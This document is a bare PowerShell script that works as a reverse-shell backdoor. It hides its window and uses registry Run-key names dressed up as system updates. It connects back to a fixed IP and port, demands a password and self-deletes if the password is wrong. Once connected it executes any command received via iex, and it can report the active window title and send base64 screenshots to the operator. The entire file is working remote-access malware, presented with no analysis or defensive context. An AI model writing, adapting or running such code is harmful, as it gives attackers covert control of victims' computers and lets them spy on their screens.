$ip = '192.168.12.99'; $port = 4444; $pass = "biskviti" 
$regPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
$regNames = @("SysUpdate", "WinDiag") 
$scriptPath = "$env:TEMP\sysupd.ps1"

$api = Add-Type -Name Win32 -MemberDefinition @'
[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
[DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
[DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder text, int count);
'@ -PassThru
$api::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)

function Master-Kill {
    foreach ($name in $regNames) { 
        Remove-ItemProperty -Path $regPath -Name $name -Force -ErrorAction SilentlyContinue 
    }
    $cmd = "/c start /min cmd /c `"taskkill /F /PID $PID & timeout /t 2 & del /f /q $scriptPath & exit`""
    Start-Process cmd.exe -ArgumentList $cmd -WindowStyle Hidden
    exit
}

while($true) {
    try {
        $c = New-Object System.Net.Sockets.TCPClient($ip, $port); $s = $c.GetStream(); $e = New-Object System.Text.UTF8Encoding
        $s.Write(($e.GetBytes("AUTH: ")), 0, 6)
        
        [byte[]]$authB = New-Object byte[] 64; $len = $s.Read($authB, 0, $authB.Length)
        if ($len -le 0) { $c.Close(); continue }
        
        if ($e.GetString($authB, 0, $len).Trim() -ne $pass) {
            $s.Write(($e.GetBytes("FATAL: Auth Fail. Self-Destructing...`n")), 0, 35)
            $c.Close()
            Master-Kill
        }

        $s.Write(($e.GetBytes("OK.`nPS $PWD> ")), 0, 12)

        [byte[]]$b = New-Object byte[] 65535
        while(($i = $s.Read($b, 0, $b.Length)) -ne 0) {
            $in = $e.GetString($b, 0, $i).Trim()
            if ($in -eq 'kill') { Master-Kill }
            elseif ($in -eq 'screen') {
                $handle = $api::GetForegroundWindow(); $sb = New-Object System.Text.StringBuilder 256
                $api::GetWindowText($handle, $sb, $sb.Capacity)
                $out = "[!] Window: " + $sb.ToString() + "`n"
            }
            elseif ($in -eq 'screenshot') {
                try {
                    Add-Type -AssemblyName System.Windows.Forms, System.Drawing
                    $sc = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                    $bmp = New-Object System.Drawing.Bitmap $sc.Width, $sc.Height
                    $g = [System.Drawing.Graphics]::FromImage($bmp); $g.CopyFromScreen($sc.X, $sc.Y, 0, 0, $bmp.Size)
                    $ms = New-Object System.IO.MemoryStream; $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
                    $out = "`n---BEGIN---`n" + [Convert]::ToBase64String($ms.ToArray()) + "`n---END---`n"
                    $g.Dispose(); $bmp.Dispose(); $ms.Dispose()
                } catch { $out = "[!] Error: $($_.Exception.Message)`n" }
            }
            else { $out = try { if ($in) { iex $in 2>&1 | Out-String } } catch { $_.Exception.Message } }
            $resp = $e.GetBytes($out + "PS $PWD> "); $s.Write($resp, 0, $resp.Length); $s.Flush()
        }
    } catch { Start-Sleep 10 }
}
